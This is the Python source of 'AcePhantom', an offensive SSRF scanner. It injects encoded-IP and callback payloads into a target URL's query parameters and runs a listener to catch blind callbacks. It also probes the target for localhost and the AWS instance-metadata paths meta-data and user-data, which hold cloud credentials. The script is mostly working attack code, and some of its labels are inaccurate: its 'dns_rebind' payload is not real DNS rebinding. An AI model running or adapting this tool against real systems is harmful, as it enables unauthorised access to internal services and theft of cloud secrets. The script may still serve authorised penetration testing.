#!/usr/bin/env python3
"""
AcePhantom – Stealth SSRF Scanner for Kali Linux
================================================
A smart, compact SSRF‑detection framework that **goes where Burp can’t**.
Now includes a blue ASCII banner (requires `colorama`).
"""

import argparse
import http.server
import ipaddress
import json
import random
import threading
import time
import uuid
from urllib.parse import urlencode, urlparse, parse_qs

import requests
from bs4 import BeautifulSoup  # sudo apt install python3-bs4
from colorama import Fore, Style, init  # sudo pip install colorama

__version__ = "0.3.1"  # AcePhantom fixed IP parsing bug

# ────────────────────────────────────────────────────────────────────────────
# BANNER
# ────────────────────────────────────────────────────────────────────────────

def print_banner():
    init(autoreset=True)
    blue = Fore.BLUE + Style.BRIGHT
    print(blue + r"""
     █████╗  ██████╗ ███████╗
    ██╔══██╗██╔════╝ ██╔════╝
    ███████║██║     █████╗  
    ██╔══██║██║     ██╔══╝  
    ██║  ██║╚██████╗███████╗
    ╚═╝  ╚═╝ ╚═════╝╚══════╝
         P H A N T O M
    """ + Style.RESET_ALL)

# ────────────────────────────────────────────────────────────────────────────
# CONFIG
# ────────────────────────────────────────────────────────────────────────────
DEFAULT_TIMEOUT = 10
LISTENER_PORT = 8008
INTERNAL_IPS = ["127.0.0.1", "[::1]", "169.254.169.254"]
AWS_IMDS_PATHS = ["latest/meta-data/", "latest/user-data/"]

# ────────────────────────────────────────────────────────────────────────────
# PAYLOAD ENGINE
# ────────────────────────────────────────────────────────────────────────────
class PayloadGenerator:
    def __init__(self, callback_host: str):
        self.callback_host = callback_host.rstrip("/")
        self.token = str(uuid.uuid4())[:8]

    @staticmethod
    def _to_hex(ip: str) -> str:
        return hex(int(ipaddress.ip_address(ip)))[2:]

    @staticmethod
    def _to_octal(ip: str) -> str:
        return "0" + oct(int(ipaddress.ip_address(ip)))[2:]

    def generate(self):
        ip_only = self.callback_host.replace("http://", "").split("/")[0].split(":")[0]
        yield {"payload": f"http://{self.callback_host}/{self.token}", "tag": "direct"}
        yield {"payload": f"http://{self._to_hex(ip_only)}/", "tag": "hex_ip"}
        yield {"payload": f"http://{self._to_octal(ip_only)}/", "tag": "oct_ip"}
        yield {"payload": "http://[::1]/", "tag": "ipv6_local"}
        yield {"payload": f"http://{random.randint(1000,9999)}.{ip_only}/", "tag": "dns_rebind"}

# ────────────────────────────────────────────────────────────────────────────
# LISTENER
# ────────────────────────────────────────────────────────────────────────────
class CallbackHandler(http.server.BaseHTTPRequestHandler):
    silent = True

    def do_GET(self):
        print(f"[CALLBACK] {self.client_address[0]} – {self.path}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, *args, **kwargs):
        if not self.silent:
            super().log_message(*args, **kwargs)

def start_listener(port: int = LISTENER_PORT):
    server = http.server.HTTPServer(("0.0.0.0", port), CallbackHandler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    print(f"[AcePhantom] Callback listener active on 0.0.0.0:{port}")
    return server

# ────────────────────────────────────────────────────────────────────────────
# SCANNER
# ────────────────────────────────────────────────────────────────────────────
class AcePhantomScanner:
    def __init__(self, target_url: str, callback: str, timeout: int = DEFAULT_TIMEOUT):
        self.target_url = target_url
        self.callback = callback
        self.timeout = timeout
        self.generator = PayloadGenerator(callback)
        self.results = []

    def _inject(self, base_url: str, payload: str):
        parsed = urlparse(base_url)
        q = parse_qs(parsed.query, keep_blank_values=True)
        if not q:
            return None
        key = next(iter(q))
        q[key] = payload
        new_query = urlencode(q, doseq=True)
        return parsed._replace(query=new_query).geturl()

    def _send(self, url: str):
        try:
            return requests.get(url, timeout=self.timeout, verify=False)
        except requests.exceptions.RequestException as err:
            print(f"[!] {err}")
            return None

    def scan(self):
        print(f"[AcePhantom] Scanning → {self.target_url}")
        for p in self.generator.generate():
            injected = self._inject(self.target_url, p["payload"]) or self.target_url
            print(f"  • {p['tag']}: {injected}")
            resp = self._send(injected)
            status = resp.status_code if resp else "ERR"
            reflected = p["payload"] in resp.text if resp else False
            self.results.append({
                "payload": p["payload"],
                "tag": p["tag"],
                "url": injected,
                "status": status,
                "reflected": reflected,
            })
        return self.results

    def crawl_internal(self):
        for ip in INTERNAL_IPS:
            for path in ["/", *AWS_IMDS_PATHS]:
                url = self._inject(self.target_url, f"http://{ip}/{path}")
                if url:
                    print(f"[INT] {url}")
                    self._send(url)

# ────────────────────────────────────────────────────────────────────────────
# BURP PARSER
# ────────────────────────────────────────────────────────────────────────────

def parse_burp_xml(path: str):
    print(f"[AcePhantom] Importing Burp XML: {path}")
    with open(path, "r", encoding="utf-8") as fh:
        soup = BeautifulSoup(fh, "xml")
    for item in soup.find_all("item"):
        yield item.url.text

# ────────────────────────────────────────────────────────────────────────────
# CLI ENTRY
# ────────────────────────────────────────────────────────────────────────────

def main():
    print_banner()
    parser = argparse.ArgumentParser(description="AcePhantom Stealth SSRF Scanner")
    src = parser.add_mutually_exclusive_group(required=False)
    src.add_argument("--url", help="Single target URL with a query param to inject")
    src.add_argument("--burp", help="Path to Burp XML export for mass re‑scan")

    parser.add_argument("--callback", default=f"http://127.0.0.1:{LISTENER_PORT}/cb", help="Callback URL for blind SSRF verification")
    parser.add_argument("--listen", action="store_true", help="Run callback listener only")
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT)
    parser.add_argument("--version", action="version", version=f"AcePhantom {__version__}")

    args = parser.parse_args()

    if args.listen and not args.url and not args.burp:
        start_listener()
        while True:
            time.sleep(60)
        return

    if not args.url and not args.burp:
        parser.error("one of the arguments --url or --burp is required (unless --listen is used alone)")

    targets = [args.url] if args.url else list(parse_burp_xml(args.burp))
    start_listener()

    results = {}
    for url in targets:
        scanner = AcePhantomScanner(url, args.callback, args.timeout)
        res = scanner.scan()
        scanner.crawl_internal()
        results[url] = res

    with open("acephantom_results.json", "w", encoding="utf-8") as fh:
        json.dump(results, fh, indent=2)
    print("[✓] Results stored in acephantom_results.json")


if __name__ == "__main__":
    main()
